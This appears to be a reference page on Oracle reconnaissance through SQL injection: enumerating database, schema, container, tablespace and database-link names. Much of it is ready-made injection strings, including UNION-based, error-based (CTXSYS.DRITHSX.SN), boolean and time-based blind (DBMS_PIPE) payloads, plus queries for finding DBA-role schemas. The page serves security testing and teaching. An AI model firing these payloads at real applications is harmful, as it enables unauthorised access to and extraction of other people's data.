---
title: Database Names
description: How to enumerate database names in Oracle
category: Information Gathering
order: 5
tags: ["databases", "schema", "enumeration"]
lastUpdated: 2026-10-08
---

In Oracle, the concept of "database names" differs from other database management systems. An application connects to one database and sees many schemas in it (schema ≈ user). This article covers how to extract database and schema information through SQL injection.

## Oracle Database Architecture

In Oracle:

- A **database** is the set of data files, identified by its name (`DB_NAME`); an **instance** is the memory and processes that serve it
- Since 12c, a **container database** (CDB) can hold several **pluggable databases** (PDBs); applications usually connect to a PDB. From 21c this is the only architecture (non-CDB databases are desupported)
- A **schema** is a collection of database objects (tables, procedures, etc.) owned by a specific user, with the same name as the user

## Current Database Context

```sql
-- Global database name (in a PDB, the PDB name)
SELECT ora_database_name FROM dual;
SELECT global_name FROM global_name;

-- Database, service and container names, available to any user
SELECT SYS_CONTEXT('USERENV','DB_NAME'), SYS_CONTEXT('USERENV','SERVICE_NAME'),
       SYS_CONTEXT('USERENV','CON_NAME') FROM dual;

-- Instance name and database ID (require SELECT_CATALOG_ROLE)
SELECT instance_name FROM v$instance;
SELECT dbid FROM v$database;
```

## Listing All Schemas/Users

Since Oracle schemas are tied to users, `ALL_USERS` lists every schema, and any user can read it:

```sql
-- List all schemas
SELECT username FROM all_users ORDER BY username;

-- List schemas with creation date
SELECT username, created FROM all_users ORDER BY created;

-- Count schemas
SELECT COUNT(*) FROM all_users;
```

## Identifying Default Schemas

Since 12.1.0.2, `ALL_USERS.ORACLE_MAINTAINED` separates the schemas Oracle creates from application schemas:

```sql
-- Schemas created by Oracle (SYS, SYSTEM, OUTLN, XDB, ...)
SELECT username FROM all_users WHERE oracle_maintained = 'Y';

-- Application schemas
SELECT username FROM all_users WHERE oracle_maintained = 'N';
```

On older versions, compare the names with a list of known default schemas (see [Default Databases](/oracle/default-databases)).

## SQL Injection Examples

These examples assume a string injection point (`'`) and, for UNION, a host query with two columns.

### UNION-Based Extraction

```sql
-- Basic schema enumeration
' UNION SELECT username,NULL FROM all_users--

-- With creation date
' UNION SELECT username||':'||created,NULL FROM all_users--

-- Only application schemas (12.1.0.2+)
' UNION SELECT username,NULL FROM all_users WHERE oracle_maintained='N'--
```

### Error-Based Extraction

`CTXSYS.DRITHSX.SN` requires Oracle Text and returns the subquery result in the error message:

```sql
-- First schema
' OR CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))=1--

-- Second schema in alphabetical order (12c+); increase OFFSET for the next ones
' OR CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY))=1--

-- All schemas in one error message
' OR CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users))=1--
```

### Blind Extraction Techniques

```sql
-- Boolean-based blind: first letter of the first schema is 'S' (83)?
admin' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--

-- Time-based blind (EXECUTE on DBMS_PIPE: often not granted to PUBLIC, check ALL_TAB_PRIVS)
admin' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83
     THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

See [Timing](/oracle/timing) for delays that need no privileges.

## Finding Database Objects Within Schemas

Once you've identified schemas, you can enumerate their objects:

```sql
-- List tables in a specific schema (replace SCHEMA_NAME)
SELECT table_name FROM all_tables WHERE owner = 'SCHEMA_NAME';

-- List tables in all schemas
SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;

-- Find tables with specific names across all schemas
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%USER%';
```

## Finding Database Links

Database links provide connections to other Oracle databases, which can be valuable targets:

```sql
-- Links visible to the current user
SELECT owner, db_link, username, host FROM all_db_links;

-- All links (DBA)
SELECT owner, db_link, username, host FROM dba_db_links;
```

## Pluggable Databases (Oracle 12c+)

```sql
-- Is this a container database? (requires SELECT_CATALOG_ROLE)
SELECT cdb FROM v$database;

-- CDB name, or NULL in a non-CDB (any user)
SELECT SYS_CONTEXT('USERENV','CDB_NAME') FROM dual;

-- Pluggable databases and containers (requires SELECT_CATALOG_ROLE)
SELECT name, open_mode FROM v$pdbs;
SELECT con_id, name, open_mode FROM v$containers;
```

From inside a PDB, `V$PDBS` and `V$CONTAINERS` only show the current PDB.

## Tablespace Information

Tablespaces are logical storage units in Oracle and can provide insights about database organization:

```sql
-- Tablespaces the current user can use
SELECT tablespace_name FROM user_tablespaces;

-- All tablespaces (DBA)
SELECT tablespace_name, status, contents FROM dba_tablespaces;
```

## TNS Listener Information

```sql
-- Service names (V$PARAMETER requires SELECT_CATALOG_ROLE, or DB_DEVELOPER_ROLE in 23ai)
SELECT name, value FROM v$parameter WHERE name LIKE '%service_name%';

-- Listener addresses (requires SELECT_CATALOG_ROLE)
SELECT * FROM v$listener_network;
```

## Practical SQL Injection Techniques

### Pagination for Large Results

When the application shows only a few rows, page through the schemas:

```sql
-- Schemas 11-20 in alphabetical order (12c+)
' UNION SELECT username,NULL FROM (SELECT username FROM all_users ORDER BY username OFFSET 10 ROWS FETCH NEXT 10 ROWS ONLY)--

-- Schemas 11-20 on any version
' UNION SELECT username,NULL FROM (SELECT username, ROWNUM rn FROM (SELECT username FROM all_users ORDER BY username)) WHERE rn BETWEEN 11 AND 20--

-- All schemas in one row (11gR2+, up to 4000 bytes)
' UNION SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username),NULL FROM all_users--
```

### Finding Schemas with Specific Privileges

```sql
-- Schemas granted the DBA role (requires access to DBA_ROLE_PRIVS)
' UNION SELECT grantee,NULL FROM dba_role_privs WHERE granted_role='DBA'--
```
